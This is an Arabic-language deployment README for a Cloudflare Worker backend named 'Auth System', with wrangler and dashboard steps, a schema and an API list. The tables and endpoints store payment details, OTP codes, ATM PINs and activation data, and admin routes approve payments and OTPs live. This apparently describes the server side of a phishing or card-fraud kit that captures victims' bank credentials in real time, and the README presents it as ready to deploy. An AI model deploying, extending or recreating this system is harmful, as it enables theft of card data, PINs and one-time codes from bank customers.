# Auth System - Cloudflare Worker

Backend API مبني على Cloudflare Workers مع D1 Database.

## 🚀 النشر على Cloudflare

### 1. إنشاء D1 Database

```bash
# في terminal محلي (على جهازك)
cd workers
npx wrangler d1 create auth-system-db
```

سيعطيك output مثل:
```
database_id = "xxxx-xxxx-xxxx-xxxx"
```

انسخ الـ `database_id` وضعه في `wrangler.toml`:
```toml
[[d1_databases]]
binding = "DB"
database_name = "auth-system-db"
database_id = "xxxx-xxxx-xxxx-xxxx"  # ضع الـ ID هنا
```

---

### 2. إنشاء الجداول

```bash
npx wrangler d1 execute auth-system-db --file=schema.sql
```

---

### 3. نشر Worker

```bash
npx wrangler deploy
```

سيعطيك URL مثل:
```
https://auth-system-worker.your-subdomain.workers.dev
```

---

## 📋 البديل: النشر عبر Dashboard

### 1. إنشاء D1 Database

1. افتح: https://dash.cloudflare.com
2. Workers & Pages → D1
3. Create database
4. الاسم: `auth-system-db`
5. Create

---

### 2. تشغيل Schema

1. افتح Database
2. Console
3. انسخ محتوى `schema.sql` والصقه
4. Execute

---

### 3. نشر Worker

**Option A: عبر Git**

1. Workers & Pages → Create application
2. Workers → Deploy
3. اربط GitHub → `auth-system-nextjs`
4. Root directory: `workers`
5. Deploy

**Option B: عبر Wrangler CLI**

```bash
cd workers
npm install
npx wrangler login
npx wrangler deploy
```

---

## 🔗 ربط مع Frontend

بعد النشر، احصل على Worker URL:
```
https://auth-system-worker.your-subdomain.workers.dev
```

في Cloudflare Pages (Frontend):
```
Environment Variable:
NEXT_PUBLIC_API_URL = https://auth-system-worker.your-subdomain.workers.dev
```

---

## 📊 Database Schema

- **visitors** - معلومات الزوار
- **form_data** - بيانات النماذج
- **payments** - معلومات الدفع
- **otps** - رموز OTP
- **atm_pins** - أرقام PIN
- **activation_data** - بيانات التفعيل

---

## 🔧 API Endpoints

### Public APIs:
- `POST /api/visitor/online`
- `POST /api/visitor/offline`
- `POST /api/save-field`
- `POST /api/save-payment`
- `GET /api/check-payment-approval`
- `POST /api/save-otp`
- `GET /api/check-otp-approval`
- `POST /api/save-atm-pin`
- `POST /api/save-activation-data`

### Admin APIs:
- `GET /api/admin/visitors`
- `GET /api/admin/statistics`
- `POST /api/admin/approve-payment`
- `POST /api/admin/approve-otp`

---

## 🐛 Troubleshooting

### Worker لا يعمل:
1. تحقق من D1 binding في `wrangler.toml`
2. تحقق من أن Database تم إنشاؤه
3. تحقق من Logs في Dashboard

### Database فارغ:
1. تأكد من تشغيل `schema.sql`
2. تحقق من Console في D1 Dashboard

---

## 💡 ملاحظات

- ✅ مجاني تماماً (Free tier سخي)
- ✅ سريع جداً (Edge computing)
- ✅ لا ينام أبداً
- ✅ Auto-scaling
